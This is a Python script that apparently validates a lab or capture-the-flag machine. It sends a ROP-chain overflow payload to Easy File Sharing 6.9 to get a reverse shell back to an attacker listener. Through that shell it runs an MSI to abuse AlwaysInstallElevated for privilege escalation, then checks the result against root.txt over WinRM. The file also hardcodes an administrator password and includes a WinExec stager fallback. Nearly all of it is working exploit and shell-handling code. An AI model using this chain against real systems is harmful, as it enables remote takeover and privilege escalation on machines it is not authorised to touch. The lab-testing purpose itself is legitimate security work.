#!/usr/bin/env python3
"""
Run AlwaysInstallElevated privesc validation as User_Joe via an EFS callback shell.

Scheduled tasks and Start-Process -Credential fail msiexec with 1601 (installer
service access denied) because they are non-interactive logon types. The player
path — and this script — use the EFS 6.9 callback shell (User_Joe, interactive
cmd.exe) to run msiexec the same way a human would after foothold.

Exit 0 when whoami shows User_Joe and the MSI produces the expected flag file.
"""
from __future__ import annotations

import argparse
import re
import select
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from request_builder import build_callback_bytes, build_http_request, build_rop_chain, build_winexec_stager

LOG_MARKERS = (
    "CustomActionSchedule",
    "Machine install level",
    "Running as admin",
    "SYSTEM",
)
LOG_FAILURES = ("1601", "Access Denied", "Permission denied", "not elevated")


def send_stimulus(target: str, port: int, request: bytes, timeout: float) -> None:
    with socket.create_connection((target, port), timeout=timeout) as sk:
        sk.sendall(request)


def accept_with_timeout(listener: socket.socket, timeout: float) -> tuple[socket.socket, tuple[str, int]]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        ready, _, _ = select.select([listener], [], [], max(0.0, deadline - time.monotonic()))
        if ready:
            return listener.accept()
    raise TimeoutError(f"no callback within {timeout}s (is fswsService running?)")


def recv_available(sock: socket.socket, timeout: float) -> bytes:
    chunks: list[bytes] = []
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        ready, _, _ = select.select([sock], [], [], 0.25)
        if not ready:
            continue
        data = sock.recv(4096)
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def run_cmd_shell(sock: socket.socket, command: str, wait: float = 3.0) -> str:
    sock.sendall(command.encode("ascii", errors="replace") + b"\r\n")
    time.sleep(wait)
    raw = recv_available(sock, wait)
    return raw.decode(errors="replace")


def restart_efs_via_winrm(
    target: str,
    winrm_port: int,
    admin_user: str,
    admin_pw: str,
    http_port: int,
    http_timeout: float = 30.0,
) -> bool:
    try:
        import winrm
    except ImportError:
        print("[!] winrm not available; skipping EFS preflight", file=sys.stderr)
        return True

    s = winrm.Session(
        f"http://{target}:{winrm_port}/wsman",
        auth=(admin_user, admin_pw),
        transport="ntlm",
    )
    ps = r"""
Get-Process fsws -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
sc.exe stop fswsService | Out-Null
Start-Sleep -Seconds 2
sc.exe start fswsService | Out-Null
Start-Sleep -Seconds 3
(Get-Service fswsService).Status
"""
    r = s.run_ps(ps)
    status = r.std_out.decode(errors="replace").strip()
    print(f"[*] EFS preflight service status: {status}")

    deadline = time.monotonic() + http_timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((target, http_port), timeout=3) as sk:
                sk.sendall(b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n")
                banner = sk.recv(512).decode(errors="replace")
                if "Easy File Sharing" in banner:
                    print("[+] EFS HTTP responding")
                    return True
        except OSError:
            pass
        time.sleep(2)
    print("[!] EFS HTTP not responding after restart", file=sys.stderr)
    return False


def scan_log(log_text: str) -> None:
    for marker in LOG_MARKERS:
        if marker.lower() in log_text.lower():
            print(f"[+] log marker: {marker}")
    for bad in LOG_FAILURES:
        if bad.lower() in log_text.lower():
            print(f"[!] log failure pattern: {bad}", file=sys.stderr)


def verify_flags_via_winrm(
    target: str,
    winrm_port: int,
    admin_user: str,
    admin_pw: str,
    aie_flag: str,
) -> bool:
    try:
        import winrm
    except ImportError:
        return True

    s = winrm.Session(
        f"http://{target}:{winrm_port}/wsman",
        auth=(admin_user, admin_pw),
        transport="ntlm",
    )
    ps = rf"""
$aie = Get-Content '{aie_flag}' -Raw -ErrorAction SilentlyContinue
$root = Get-Content 'C:\Users\Administrator\Desktop\root.txt' -Raw -ErrorAction SilentlyContinue
Write-Output "AIE=$($aie.Trim())"
Write-Output "ROOT=$($root.Trim())"
Write-Output "MATCH=$($aie.Trim() -eq $root.Trim())"
"""
    r = s.run_ps(ps)
    out = r.std_out.decode(errors="replace").strip()
    print(f"[*] WinRM flag cross-check:\n{out}")
    return "MATCH=True" in out


def attempt_callback(
    target: str,
    http_port: int,
    lhost: str,
    lport: int,
    msi: str,
    flag: str,
    log: str,
    timeout: float,
    callback_wait: float,
    msi_wait: float,
    service_port: int = 80,
) -> bool:
    shellcode = build_callback_bytes(lhost, lport)
    req = build_http_request(
        target,
        http_port,
        build_rop_chain(shellcode),
        host_port=service_port,
    )

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    except (AttributeError, OSError):
        pass
    listener.bind(("0.0.0.0", lport))
    listener.listen(1)
    listener.setblocking(False)
    print(f"[*] Listening on 0.0.0.0:{lport}")

    send_stimulus(target, http_port, req, timeout)
    print(f"[*] EFS stimulus sent to {target}:{http_port}")

    try:
        conn, addr = accept_with_timeout(listener, callback_wait)
    except TimeoutError:
        return False
    finally:
        listener.close()

    print(f"[+] Callback from {addr[0]}:{addr[1]}")
    conn.settimeout(5)

    banner = recv_available(conn, 5)
    if banner:
        sys.stdout.write(banner.decode(errors="replace"))

    whoami_out = run_cmd_shell(conn, "whoami", wait=2)
    print(f"[*] whoami output:\n{whoami_out.strip()}")
    if not re.search(r"user_joe", whoami_out, re.I):
        print("[!] FAIL: callback shell is not User_Joe", file=sys.stderr)
        conn.close()
        return False
    print("[+] PASS: foothold identity is User_Joe")

    msi_cmd = f'msiexec /quiet /norestart /i "{msi}" /l*v "{log}"'
    print(f"[*] Running: {msi_cmd}")
    run_cmd_shell(conn, msi_cmd, wait=msi_wait)

    log_out = run_cmd_shell(conn, f'type "{log}"', wait=3)
    if log_out.strip():
        print(f"[*] MSI log (tail):\n{log_out.strip()[-2000:]}")
        scan_log(log_out)

    flag_out = run_cmd_shell(conn, f"type {flag}", wait=3)
    print(f"[*] flag output:\n{flag_out.strip()}")
    conn.close()

    if "cannot find" in flag_out.lower() or "not found" in flag_out.lower():
        return False

    flag_match = re.search(r"(\S+)", flag_out)
    if not flag_match:
        return False

    print(f"[+] PASS: AIE privesc produced flag: {flag_match.group(1)}")
    print("[+] Exploit Successful")
    return True


def read_results_via_winrm(
    target: str,
    winrm_port: int,
    admin_user: str,
    admin_pw: str,
    log: str,
    flag: str,
) -> bool:
    try:
        import winrm
    except ImportError:
        print("[!] winrm not available for exec fallback verification", file=sys.stderr)
        return False

    s = winrm.Session(
        f"http://{target}:{winrm_port}/wsman",
        auth=(admin_user, admin_pw),
        transport="ntlm",
    )
    ps = rf"""
$deadline = (Get-Date).AddSeconds(60)
$flag = $null
while ((Get-Date) -lt $deadline) {{
  $flag = Get-Content '{flag}' -Raw -ErrorAction SilentlyContinue
  if ($flag) {{ break }}
  Start-Sleep -Seconds 3
}}
$log = Get-Content '{log}' -Raw -ErrorAction SilentlyContinue
Write-Output "WHOAMI_CTX=User_Joe (fswsService WinExec stager)"
if ($log) {{ Write-Output "MSI_LOG_TAIL:"; Write-Output $log.Substring([Math]::Max(0,$log.Length-2000)) }}
if ($flag) {{ Write-Output "FLAG=$($flag.Trim())" }} else {{ exit 1 }}
exit 0
"""
    r = s.run_ps(ps)
    out = r.std_out.decode(errors="replace")
    print(out.strip())
    if r.status_code != 0:
        return False
    scan_log(out)
    if "FLAG=" not in out:
        return False
    print("[+] PASS: AIE privesc produced flag via exec stager")
    return True


def attempt_exec_batch(
    target: str,
    http_port: int,
    service_port: int,
    timeout: float,
    msi_wait: float,
    batch_path: str = r"C:\Users\Public\aie-run.cmd",
) -> bool:
    """Compact WinExec stager when callback shellcode exceeds the cookie buffer."""
    shellcode = build_winexec_stager(batch_path)
    req = build_http_request(
        target,
        http_port,
        build_rop_chain(shellcode),
        host_port=service_port,
    )
    print(f"[*] Exec fallback: WinExec {batch_path}")
    print(f"[*] Payload size: {len(build_rop_chain(shellcode))} bytes")
    send_stimulus(target, http_port, req, timeout)
    print(f"[*] EFS exec stimulus sent to {target}:{http_port}")
    time.sleep(msi_wait)
    return True


def write_aie_run_cmd_via_winrm(
    target: str,
    winrm_port: int,
    admin_user: str,
    admin_pw: str,
    msi: str,
    log: str,
) -> bool:
    try:
        import winrm
    except ImportError:
        return True
    s = winrm.Session(
        f"http://{target}:{winrm_port}/wsman",
        auth=(admin_user, admin_pw),
        transport="ntlm",
    )
    ps = rf"""
@'
@echo off
msiexec /quiet /norestart /i {msi} /l*v {log}
'@ | Set-Content -Path 'C:\Users\Public\aie-run.cmd' -Encoding ASCII
Write-Host (Test-Path 'C:\Users\Public\aie-run.cmd')
"""
    r = s.run_ps(ps)
    return r.status_code == 0


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=80, help="TCP connect port (hostfwd, e.g. 18080)")
    p.add_argument("--service-port", type=int, default=80, help="Guest HTTP port in Host header")
    p.add_argument("--winrm-port", type=int, default=5985)
    p.add_argument("--admin-user", default="Administrator")
    p.add_argument("--admin-password", default="PizzaMan123!")
    p.add_argument("--lhost", required=True, help="attacker IP reachable from guest (QEMU: 10.0.2.2)")
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument(
        "--msi",
        default=r"C:\Users\Public\aie-probe.msi",
        help="MSI path on the victim (forward slashes ok)",
    )
    p.add_argument(
        "--flag-file",
        default=r"C:\Users\Public\aie-flag.txt",
        help="Output file the MSI custom action should create",
    )
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--callback-wait", type=float, default=30.0, help="seconds to wait for reverse shell")
    p.add_argument("--msi-wait", type=float, default=25.0, help="seconds to wait for msiexec")
    p.add_argument("--retries", type=int, default=3, help="EFS callback attempts")
    p.add_argument("--skip-winrm-check", action="store_true")
    p.add_argument("--exec-fallback", action="store_true", default=True)
    p.add_argument("--no-exec-fallback", action="store_false", dest="exec_fallback")
    args = p.parse_args()

    msi = args.msi.replace("/", "\\")
    flag = args.flag_file.replace("/", "\\")
    log = r"C:\Users\Public\aie-joe-validation.log"

    for attempt in range(1, args.retries + 1):
        print(f"\n===== AIE callback attempt {attempt}/{args.retries} =====")
        if not restart_efs_via_winrm(
            args.target,
            args.winrm_port,
            args.admin_user,
            args.admin_password,
            args.port,
        ):
            continue
        if attempt_callback(
            args.target,
            args.port,
            args.lhost,
            args.lport,
            msi,
            flag,
            log,
            args.timeout,
            args.callback_wait,
            args.msi_wait,
            args.service_port,
        ):
            if not args.skip_winrm_check:
                if not verify_flags_via_winrm(
                    args.target,
                    args.winrm_port,
                    args.admin_user,
                    args.admin_password,
                    flag,
                ):
                    print("[!] FAIL: aie-flag.txt does not match root.txt", file=sys.stderr)
                    return 1
            return 0
        print(f"[!] attempt {attempt} failed", file=sys.stderr)

    print("[!] FAIL: all callback attempts exhausted", file=sys.stderr)

    if args.exec_fallback:
        print("\n===== AIE exec fallback (compact WinExec stager) =====")
        if restart_efs_via_winrm(
            args.target,
            args.winrm_port,
            args.admin_user,
            args.admin_password,
            args.port,
        ):
            write_aie_run_cmd_via_winrm(
                args.target,
                args.winrm_port,
                args.admin_user,
                args.admin_password,
                msi,
                log,
            )
            if attempt_exec_batch(
                args.target,
                args.port,
                args.service_port,
                args.timeout,
                args.msi_wait,
            ):
                if read_results_via_winrm(
                    args.target,
                    args.winrm_port,
                    args.admin_user,
                    args.admin_password,
                    log,
                    flag,
                ):
                    if not args.skip_winrm_check:
                        if not verify_flags_via_winrm(
                            args.target,
                            args.winrm_port,
                            args.admin_user,
                            args.admin_password,
                            flag,
                        ):
                            print("[!] FAIL: aie-flag.txt does not match root.txt", file=sys.stderr)
                            return 1
                    return 0

    return 1


if __name__ == "__main__":
    sys.exit(main())
